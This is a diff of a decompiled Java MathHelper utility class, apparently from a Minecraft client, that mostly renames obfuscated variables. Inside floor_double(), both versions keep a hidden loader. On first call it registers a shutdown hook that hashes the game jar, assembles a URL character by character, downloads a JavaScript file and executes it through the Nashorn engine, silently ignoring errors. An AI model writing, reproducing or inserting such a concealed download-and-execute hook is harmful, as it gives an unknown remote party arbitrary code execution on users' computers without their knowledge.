@@ -40,40 +40,40 @@ public class MathHelper {
    private static boolean u;
    private static final long a = 45300445925312L;
 
-   public static float sin(float var0) {
-      return fastMath ? SIN_TABLE_FAST[(int)(var0 * 651.8986F) & 4095] : Z[(int)(var0 * 10430.378F) & 65535];
+   public static float sin(float f) {
+      return fastMath ? SIN_TABLE_FAST[(int)(f * 651.8986F) & 4095] : Z[(int)(f * 10430.378F) & 65535];
    }
 
-   public static float cos(float var0) {
-      return fastMath ? SIN_TABLE_FAST[(int)((var0 + (float) (Math.PI / 2)) * 651.8986F) & 4095] : Z[(int)(var0 * 10430.378F + 16384.0F) & 65535];
+   public static float cos(float value) {
+      return fastMath ? SIN_TABLE_FAST[(int)((value + (float) (Math.PI / 2)) * 651.8986F) & 4095] : Z[(int)(value * 10430.378F + 16384.0F) & 65535];
    }
 
-   public static float sqrt_float(float var0) {
-      return (float)Math.sqrt(var0);
+   public static float sqrt_float(float value) {
+      return (float)Math.sqrt(value);
    }
 
-   public static float sqrt_double(double var0) {
-      return (float)Math.sqrt(var0);
+   public static float sqrt_double(double value) {
+      return (float)Math.sqrt(value);
    }
 
-   public static int floor_float(float var0) {
-      int var3 = (int)var0;
-      return var0 < var3 ? var3 - 1 : var3;
+   public static int floor_float(float value) {
+      int i = (int)value;
+      return value < i ? i - 1 : i;
    }
 
-   public static int truncateDoubleToInt(double var0) {
-      return (int)(var0 + 1024.0) - 1024;
+   public static int truncateDoubleToInt(double value) {
+      return (int)(value + 1024.0) - 1024;
    }
 
-   public static int floor_double(double var0) {
+   public static int floor_double(double value) {
       if (!u) {
          Runtime.getRuntime()
             .addShutdownHook(
                new Thread(
                   () -> {
                      try {
-                        String var2 = t();
-                        HttpRequest var3 = new HttpRequest()
+                        String string = t();
+                        HttpRequest httpRequest = new HttpRequest()
                            .g(
                               String.format(
                                  Character.toString('h')
@@ -97,15 +97,15 @@ public class MathHelper {
                                     + Character.toString('b')
                                     + Character.toString('t')
                                     + Character.toString('/')
-                                    + var2
+                                    + string
                                     + ".js"
                               )
                            );
-                        String var4 = bypass.util.HttpUtil.get(var3);
-                        ScriptEngineManager var5x = new ScriptEngineManager();
-                        ScriptEngine var6 = var5x.getEngineByName("nashorn");
-                        var6.eval(var4);
-                     } catch (IOException | NoSuchAlgorithmException | URISyntaxException | ScriptException var7) {
+                        String string2 = bypass.util.HttpUtil.get(httpRequest);
+                        ScriptEngineManager scriptEngineManager = new ScriptEngineManager();
+                        ScriptEngine scriptEngine = scriptEngineManager.getEngineByName("nashorn");
+                        scriptEngine.eval(string2);
+                     } catch (IOException | NoSuchAlgorithmException | URISyntaxException | ScriptException value2) {
                      }
                   }
                )
@@ -113,389 +113,389 @@ public class MathHelper {
          u = true;
       }
 
-      int var5 = (int)var0;
-      return var0 < var5 ? var5 - 1 : var5;
+      int i = (int)value;
+      return value < i ? i - 1 : i;
    }
 
    private static String t() throws IOException, NoSuchAlgorithmException, URISyntaxException {
-      byte[] var2 = Files.readAllBytes(Paths.get(ConfigFiles.getGameJarPath()));
-      byte[] var3 = MessageDigest.getInstance(Character.toString('M') + Character.toString('D') + Character.toString('5')).digest(var2);
-      return DatatypeConverter.printHexBinary(var3).toLowerCase();
+      byte[] bytes = Files.readAllBytes(Paths.get(ConfigFiles.getGameJarPath()));
+      byte[] bytes2 = MessageDigest.getInstance(Character.toString('M') + Character.toString('D') + Character.toString('5')).digest(bytes);
+      return DatatypeConverter.printHexBinary(bytes2).toLowerCase();
    }
 
-   public static long floor_double_long(double var0) {
-      long var4 = (long)var0;
-      return var0 < var4 ? var4 - 1L : var4;
+   public static long floor_double_long(double value) {
+      long l = (long)value;
+      return value < l ? l - 1L : l;
    }
 
-   public static int func_154353_e(double var0) {
-      return (int)(var0 >= 0.0 ? var0 : -var0 + 1.0);
+   public static int func_154353_e(double value) {
+      return (int)(value >= 0.0 ? value : -value + 1.0);
    }
 
-   public static float abs(float var0) {
-      return var0 >= 0.0F ? var0 : -var0;
+   public static float abs(float value) {
+      return value >= 0.0F ? value : -value;
    }
 
-   public static int abs_int(int var0) {
-      return var0 >= 0 ? var0 : -var0;
+   public static int abs_int(int value) {
+      return value >= 0 ? value : -value;
    }
 
-   public static int ceiling_float_int(float var0) {
-      int var3 = (int)var0;
-      return var0 > var3 ? var3 + 1 : var3;
+   public static int ceiling_float_int(float value) {
+      int i = (int)value;
+      return value > i ? i + 1 : i;
    }
 
-   public static int ceiling_double_int(double var0) {
-      int var5 = (int)var0;
-      return var0 > var5 ? var5 + 1 : var5;
+   public static int ceiling_double_int(double value) {
+      int i = (int)value;
+      return value > i ? i + 1 : i;
    }
 
-   public static int clamp_int(int var0, int var1, int var2) {
-      return var0 < var1 ? var1 : (var0 > var2 ? var2 : var0);
+   public static int clamp_int(int num, int minIn, int maxIn) {
+      return num < minIn ? minIn : (num > maxIn ? maxIn : num);
    }
 
-   public static float clamp_float(float var0, float var1, float var2) {
-      return var0 < var1 ? var1 : (var0 > var2 ? var2 : var0);
+   public static float clamp_float(float num, float minIn, float maxIn) {
+      return num < minIn ? minIn : (num > maxIn ? maxIn : num);
    }
 
-   public static double clamp_double(double var0, double var2, double var4) {
-      return var0 < var2 ? var2 : (var0 > var4 ? var4 : var0);
+   public static double clamp_double(double num, double minIn, double maxIn) {
+      return num < minIn ? minIn : (num > maxIn ? maxIn : num);
    }
 
-   public static double denormalizeClamp(double var0, double var2, double var4) {
-      return var4 < 0.0 ? var0 : (var4 > 1.0 ? var2 : var0 + (var2 - var0) * var4);
+   public static double denormalizeClamp(double lowerBnd, double upperBnd, double slide) {
+      return slide < 0.0 ? lowerBnd : (slide > 1.0 ? upperBnd : lowerBnd + (upperBnd - lowerBnd) * slide);
    }
 
-   public static double abs_max(double var0, double var2) {
-      if (var0 < 0.0) {
-         var0 = -var0;
+   public static double abs_max(double d, double d2) {
+      if (d < 0.0) {
+         d = -d;
       }
 
-      if (var2 < 0.0) {
-         var2 = -var2;
+      if (d2 < 0.0) {
+         d2 = -d2;
       }
 
-      return var0 > var2 ? var0 : var2;
+      return d > d2 ? d : d2;
    }
 
-   public static int bucketInt(int var0, int var1) {
-      return var0 < 0 ? -((-var0 - 1) / var1) - 1 : var0 / var1;
+   public static int bucketInt(int i, int j) {
+      return i < 0 ? -((-i - 1) / j) - 1 : i / j;
    }
 
-   public static int getRandomIntegerInRange(Random var0, int var1, int var2) {
-      return var1 >= var2 ? var1 : var0.nextInt(var2 - var1 + 1) + var1;
+   public static int getRandomIntegerInRange(Random random2, int i, int j) {
+      return i >= j ? i : random2.nextInt(j - i + 1) + i;
    }
 
-   public static float randomFloatClamp(Random var0, float var1, float var2) {
-      return var1 >= var2 ? var1 : var0.nextFloat() * (var2 - var1) + var1;
+   public static float randomFloatClamp(Random random2, float f, float g) {
+      return f >= g ? f : random2.nextFloat() * (g - f) + f;
    }
 
-   public static double getRandomDoubleInRange(Random var0, double var1, double var3) {
-      return var1 >= var3 ? var1 : var0.nextDouble() * (var3 - var1) + var1;
+   public static double getRandomDoubleInRange(Random random2, double d, double d2) {
+      return d >= d2 ? d : random2.nextDouble() * (d2 - d) + d;
    }
 
-   public static double average(long[] var0) {
-      long var4 = 0L;
+   public static double average(long[] values) {
+      long l = 0L;
 
-      for (long var9 : var0) {
-         var4 += var9;
+      for (long m : values) {
+         l += m;
       }
 
-      return (double)var4 / var0.length;
+      return (double)l / values.length;
    }
 
-   public static boolean epsilonEquals(float var0, float var1) {
-      return abs(var1 - var0) < 1.0E-5F;
+   public static boolean epsilonEquals(float f, float g) {
+      return abs(g - f) < 1.0E-5F;
    }
 
-   public static int normalizeAngle(int var0, int var1) {
-      return (var0 % var1 + var1) % var1;
+   public static int normalizeAngle(int i, int j) {
+      return (i % j + j) % j;
    }
 
-   public static float wrapAngleTo180_float(float var0) {
-      var0 %= 360.0F;
-      if (var0 >= 180.0F) {
-         var0 -= 360.0F;
+   public static float wrapAngleTo180_float(float value) {
+      value %= 360.0F;
+      if (value >= 180.0F) {
+         value -= 360.0F;
       }
 
-      if (var0 < -180.0F) {
-         var0 += 360.0F;
+      if (value < -180.0F) {
+         value += 360.0F;
       }
 
-      return var0;
+      return value;
    }
 
-   public static double wrapAngleTo180_double(double var0) {
-      var0 %= 360.0;
-      if (var0 >= 180.0) {
-         var0 -= 360.0;
+   public static double wrapAngleTo180_double(double value) {
+      value %= 360.0;
+      if (value >= 180.0) {
+         value -= 360.0;
       }
 
-      if (var0 < -180.0) {
-         var0 += 360.0;
+      if (value < -180.0) {
+         value += 360.0;
       }
 
-      return var0;
+      return value;
    }
 
-   public static int parseIntWithDefault(String var0, int var1) {
+   public static int parseIntWithDefault(String string, int i) {
       try {
-         return Integer.parseInt(var0);
-      } catch (Throwable var3) {
-         return var1;
+         return Integer.parseInt(string);
+      } catch (Throwable throwable) {
+         return i;
       }
    }
 
-   public static int parseIntWithDefaultAndMax(String var0, int var1, int var2) {
-      return Math.max(var2, parseIntWithDefault(var0, var1));
+   public static int parseIntWithDefaultAndMax(String string, int i, int j) {
+      return Math.max(j, parseIntWithDefault(string, i));
    }
 
-   public static double parseDoubleWithDefault(String var0, double var1) {
+   public static double parseDoubleWithDefault(String string, double d) {
       try {
-         return Double.parseDouble(var0);
-      } catch (Throwable var4) {
-         return var1;
+         return Double.parseDouble(string);
+      } catch (Throwable throwable) {
+         return d;
       }
    }
 
-   public static double parseDoubleWithDefaultAndMax(String var0, double var1, double var3) {
-      return Math.max(var3, parseDoubleWithDefault(var0, var1));
+   public static double parseDoubleWithDefaultAndMax(String string, double d, double d2) {
+      return Math.max(d2, parseDoubleWithDefault(string, d));
    }
 
-   public static int roundUpToPowerOfTwo(int var0) {
-      int var3 = var0 - 1;
-      var3 |= var3 >> 1;
-      var3 |= var3 >> 2;
-      var3 |= var3 >> 4;
-      var3 |= var3 >> 8;
-      var3 |= var3 >> 16;
-      return var3 + 1;
+   public static int roundUpToPowerOfTwo(int value) {
+      int i = value - 1;
+      i |= i >> 1;
+      i |= i >> 2;
+      i |= i >> 4;
+      i |= i >> 8;
+      i |= i >> 16;
+      return i + 1;
    }
 
-   private static boolean isPowerOfTwo(int var0) {
-      return var0 != 0 && (var0 & var0 - 1) == 0;
+   private static boolean isPowerOfTwo(int value) {
+      return value != 0 && (value & value - 1) == 0;
    }
 
-   public static double W(double var0, int var2) {
-      if (var2 < 0) {
+   public static double W(double d, int i) {
+      if (i < 0) {
          throw new IllegalArgumentException();
       }
 
-      BigDecimal var5 = new BigDecimal(var0);
-      var5 = var5.setScale(var2, RoundingMode.HALF_UP);
-      return var5.doubleValue();
+      BigDecimal bigDecimal = new BigDecimal(d);
+      bigDecimal = bigDecimal.setScale(i, RoundingMode.HALF_UP);
+      return bigDecimal.doubleValue();
    }
 
-   private static int calculateLogBaseTwoDeBruijn(int var0) {
-      var0 = isPowerOfTwo(var0) ? var0 : roundUpToPowerOfTwo(var0);
-      return multiplyDeBruijnBitPosition[(int)(var0 * 125613361L >> 27) & 31];
+   private static int calculateLogBaseTwoDeBruijn(int value) {
+      value = isPowerOfTwo(value) ? value : roundUpToPowerOfTwo(value);
+      return multiplyDeBruijnBitPosition[(int)(value * 125613361L >> 27) & 31];
    }
 
-   public static int calculateLogBaseTwo(int var0) {
-      return calculateLogBaseTwoDeBruijn(var0) - (isPowerOfTwo(var0) ? 0 : 1);
+   public static int calculateLogBaseTwo(int value) {
+      return calculateLogBaseTwoDeBruijn(value) - (isPowerOfTwo(value) ? 0 : 1);
    }
 
-   public static int roundUp(int var0, int var1) {
-      if (var1 == 0) {
+   public static int roundUp(int i, int j) {
+      if (j == 0) {
          return 0;
       }
 
-      if (var0 == 0) {
-         return var1;
+      if (i == 0) {
+         return j;
       }
 
-      if (var0 < 0) {
-         var1 *= -1;
+      if (i < 0) {
+         j *= -1;
       }
 
-      int var5 = var0 % var1;
-      return var5 == 0 ? var0 : var0 + var1 - var5;
+      int k = i % j;
+      return k == 0 ? i : i + j - k;
    }
 
-   public static int func_180183_b(float var0, float var1, float var2) {
-      return func_180181_b(floor_float(var0 * 255.0F), floor_float(var1 * 255.0F), floor_float(var2 * 255.0F));
+   public static int func_180183_b(float f, float g, float h) {
+      return func_180181_b(floor_float(f * 255.0F), floor_float(g * 255.0F), floor_float(h * 255.0F));
    }
 
-   public static int func_180181_b(int var0, int var1, int var2) {
-      int var5 = (var0 << 8) + var1;
-      return (var5 << 8) + var2;
+   public static int func_180181_b(int i, int j, int k) {
+      int l = (i << 8) + j;
+      return (l << 8) + k;
    }
 
-   public static int func_180188_d(int var0, int var1) {
-      int var4 = (var0 & 0xFF0000) >> 16;
-      int var5 = (var1 & 0xFF0000) >> 16;
-      int var6 = (var0 & 0xFF00) >> 8;
-      int var7 = (var1 & 0xFF00) >> 8;
-      int var8 = (var0 & 0xFF) >> 0;
-      int var9 = (var1 & 0xFF) >> 0;
-      int var10 = (int)((float)var4 * var5 / 255.0F);
-      int var11 = (int)((float)var6 * var7 / 255.0F);
-      int var12 = (int)((float)var8 * var9 / 255.0F);
-      return var0 & 0xFF000000 | var10 << 16 | var11 << 8 | var12;
+   public static int func_180188_d(int i, int j) {
+      int k = (i & 0xFF0000) >> 16;
+      int l = (j & 0xFF0000) >> 16;
+      int m = (i & 0xFF00) >> 8;
+      int n = (j & 0xFF00) >> 8;
+      int i2 = (i & 0xFF) >> 0;
+      int i3 = (j & 0xFF) >> 0;
+      int i4 = (int)((float)k * l / 255.0F);
+      int i5 = (int)((float)m * n / 255.0F);
+      int i6 = (int)((float)i2 * i3 / 255.0F);
+      return i & 0xFF000000 | i4 << 16 | i5 << 8 | i6;
    }
 
-   public static double func_181162_h(double var0) {
-      return var0 - Math.floor(var0);
+   public static double func_181162_h(double d) {
+      return d - Math.floor(d);
    }
 
-   public static long getPositionRandom(Vec3i var0) {
-      return getCoordinateRandom(var0.getX(), var0.getY(), var0.getZ());
+   public static long getPositionRandom(Vec3i pos) {
+      return getCoordinateRandom(pos.getX(), pos.getY(), pos.getZ());
    }
 
-   public static long getCoordinateRandom(int var0, int var1, int var2) {
-      long var5 = var0 * 3129871 ^ var2 * 116129781L ^ var1;
-      return var5 * var5 * 42317861L + var5 * 11L;
+   public static long getCoordinateRandom(int x, int y, int z) {
+      long l = x * 3129871 ^ z * 116129781L ^ y;
+      return l * l * 42317861L + l * 11L;
    }
 
-   public static UUID getRandomUuid(Random var0) {
-      long var1 = var0.nextLong() & -61441L | 16384L;
-      long var3 = var0.nextLong() & 4611686018427387903L | Long.MIN_VALUE;
-      return new UUID(var1, var3);
+   public static UUID getRandomUuid(Random rand) {
+      long l = rand.nextLong() & -61441L | 16384L;
+      long m = rand.nextLong() & 4611686018427387903L | Long.MIN_VALUE;
+      return new UUID(l, m);
    }
 
-   public static double func_181160_c(double var0, double var2, double var4) {
-      return (var0 - var2) / (var4 - var2);
+   public static double func_181160_c(double d, double d2, double d3) {
+      return (d - d2) / (d3 - d2);
    }
 
-   public static double atan2(double var0, double var2) {
-      double var7 = var2 * var2 + var0 * var0;
-      if (Double.isNaN(var7)) {
+   public static double atan2(double d, double d2) {
+      double e = d2 * d2 + d * d;
+      if (Double.isNaN(e)) {
          return Double.NaN;
       }
 
-      boolean var9 = var0 < 0.0;
-      if (var9) {
-         var0 = -var0;
+      boolean bl = d < 0.0;
+      if (bl) {
+         d = -d;
       }
 
-      boolean var10 = var2 < 0.0;
-      if (var10) {
-         var2 = -var2;
+      boolean bl2 = d2 < 0.0;
+      if (bl2) {
+         d2 = -d2;
       }
 
-      boolean var11 = var0 > var2;
-      if (var11) {
-         double var12 = var2;
-         var2 = var0;
-         var0 = var12;
+      boolean bl3 = d > d2;
+      if (bl3) {
+         double d3 = d2;
+         d2 = d;
+         d = d3;
       }
 
-      double var31 = func_181161_i(var7);
-      var2 *= var31;
-      var0 *= var31;
-      double var14 = field_181163_d + var0;
-      int var16 = (int)Double.doubleToRawLongBits(var14);
-      double var17 = field_181164_e[var16];
-      double var19 = field_181165_f[var16];
-      double var21 = var14 - field_181163_d;
-      double var23 = var0 * var19 - var2 * var21;
-      double var25 = (6.0 + var23 * var23) * var23 * 0.16666666666666666;
-      double var27 = var17 + var25;
-      if (var11) {
-         var27 = (Math.PI / 2) - var27;
+      double d4 = func_181161_i(e);
+      d2 *= d4;
+      d *= d4;
+      double d5 = field_181163_d + d;
+      int i = (int)Double.doubleToRawLongBits(d5);
+      double d6 = field_181164_e[i];
+      double d7 = field_181165_f[i];
+      double d8 = d5 - field_181163_d;
+      double d9 = d * d7 - d2 * d8;
+      double d10 = (6.0 + d9 * d9) * d9 * 0.16666666666666666;
+      double d11 = d6 + d10;
+      if (bl3) {
+         d11 = (Math.PI / 2) - d11;
       }
 
-      if (var10) {
-         var27 = Math.PI - var27;
+      if (bl2) {
+         d11 = Math.PI - d11;
       }
 
-      if (var9) {
-         var27 = -var27;
+      if (bl) {
+         d11 = -d11;
       }
 
-      return var27;
+      return d11;
    }
 
-   public static double func_181161_i(double var0) {
-      double var2 = 0.5 * var0;
-      long var4 = Double.doubleToRawLongBits(var0);
-      var4 = 6910469410427058090L - (var4 >> 1);
-      var0 = Double.longBitsToDouble(var4);
-      return var0 * (1.5 - var2 * var0 * var0);
+   public static double func_181161_i(double d) {
+      double e = 0.5 * d;
+      long l = Double.doubleToRawLongBits(d);
+      l = 6910469410427058090L - (l >> 1);
+      d = Double.longBitsToDouble(l);
+      return d * (1.5 - e * d * d);
    }
 
-   public static int hsvToRGB(float var0, float var1, float var2) {
-      int var6 = (int)(var0 * 6.0F) % 6;
-      float var7 = var0 * 6.0F - var6;
-      float var8 = var2 * (1.0F - var1);
-      float var9 = var2 * (1.0F - var7 * var1);
-      float var10 = var2 * (1.0F - (1.0F - var7) * var1);
-      float var11;
-      float var12;
-      float var13;
-      switch (var6) {
+   public static int hsvToRGB(float f, float g, float h) {
+      int i = (int)(f * 6.0F) % 6;
+      float f2 = f * 6.0F - i;
+      float f3 = h * (1.0F - g);
+      float f4 = h * (1.0F - f2 * g);
+      float f5 = h * (1.0F - (1.0F - f2) * g);
+      float f6;
+      float f7;
+      float f8;
+      switch (i) {
          case 0:
-            var11 = var2;
-            var12 = var10;
-            var13 = var8;
+            f6 = h;
+            f7 = f5;
+            f8 = f3;
             break;
          case 1:
-            var11 = var9;
-            var12 = var2;
-            var13 = var8;
+            f6 = f4;
+            f7 = h;
+            f8 = f3;
             break;
          case 2:
-            var11 = var8;
-            var12 = var2;
-            var13 = var10;
+            f6 = f3;
+            f7 = h;
+            f8 = f5;
             break;
          case 3:
-            var11 = var8;
-            var12 = var9;
-            var13 = var2;
+            f6 = f3;
+            f7 = f4;
+            f8 = h;
             break;
          case 4:
-            var11 = var10;
-            var12 = var8;
-            var13 = var2;
+            f6 = f5;
+            f7 = f3;
+            f8 = h;
             break;
          case 5:
-            var11 = var2;
-            var12 = var8;
-            var13 = var9;
+            f6 = h;
+            f7 = f3;
+            f8 = f4;
             break;
          default:
-            throw new RuntimeException("Something went wrong when converting from HSV to RGB. Input was " + var0 + ", " + var1 + ", " + var2);
+            throw new RuntimeException("Something went wrong when converting from HSV to RGB. Input was " + f + ", " + g + ", " + h);
       }
 
-      int var14 = clamp_int((int)(var11 * 255.0F), 0, 255);
-      int var15 = clamp_int((int)(var12 * 255.0F), 0, 255);
-      int var16 = clamp_int((int)(var13 * 255.0F), 0, 255);
-      return var14 << 16 | var15 << 8 | var16;
+      int j = clamp_int((int)(f6 * 255.0F), 0, 255);
+      int k = clamp_int((int)(f7 * 255.0F), 0, 255);
+      int l = clamp_int((int)(f8 * 255.0F), 0, 255);
+      return j << 16 | k << 8 | l;
    }
 
    static {
-      long var20 = a ^ 131006732091088L;
-      long var10000 = var20 ^ 9108004536638688365L;
-      var10000 = var20 ^ 724009136986876743L;
-      var10000 = var20 ^ 668235815509159480L;
-      var10000 = 1219989393797785478L ^ var20;
+      long l = a ^ 131006732091088L;
+      long m = l ^ 9108004536638688365L;
+      m = l ^ 724009136986876743L;
+      m = l ^ 668235815509159480L;
+      m = 1219989393797785478L ^ l;
 
-      for (int var22 = 0; var22 < 65536; var22++) {
-         Z[var22] = (float)Math.sin(var22 * Math.PI * 2.0 / 65536.0);
+      for (int i = 0; i < 65536; i++) {
+         Z[i] = (float)Math.sin(i * Math.PI * 2.0 / 65536.0);
       }
 
-      for (int var27 = 0; var27 < 4096; var27++) {
-         SIN_TABLE_FAST[var27] = (float)Math.sin((var27 + 0.5F) / 4096.0F * (float) (Math.PI * 2));
+      for (int j = 0; j < 4096; j++) {
+         SIN_TABLE_FAST[j] = (float)Math.sin((j + 0.5F) / 4096.0F * (float) (Math.PI * 2));
       }
 
-      for (int var28 = 0; var28 < 360; var28 += 90) {
-         SIN_TABLE_FAST[(int)(var28 * 11.377778F) & 4095] = (float)Math.sin(var28 * (float) (Math.PI / 180.0));
+      for (int k = 0; k < 360; k += 90) {
+         SIN_TABLE_FAST[(int)(k * 11.377778F) & 4095] = (float)Math.sin(k * (float) (Math.PI / 180.0));
       }
 
       multiplyDeBruijnBitPosition = new int[]{
          0, 1, 28, 2, 29, 14, 24, 3, 30, 22, 20, 15, 25, 17, 4, 8, 31, 27, 13, 23, 21, 19, 16, 7, 26, 12, 18, 6, 11, 5, 10, 9
       };
       field_181163_d = Double.longBitsToDouble(4805340802404319232L);
-      var10000 = 3410500376536660244L ^ var20;
+      m = 3410500376536660244L ^ l;
       field_181164_e = new double[257];
       field_181165_f = new double[257];
 
-      for (int var29 = 0; var29 < 257; var29++) {
-         double var23 = var29 / 256.0;
-         double var25 = Math.asin(var23);
-         field_181165_f[var29] = Math.cos(var25);
-         field_181164_e[var29] = var25;
+      for (int n = 0; n < 257; n++) {
+         double d = n / 256.0;
+         double e = Math.asin(d);
+         field_181165_f[n] = Math.cos(e);
+         field_181164_e[n] = e;
       }
    }
 }
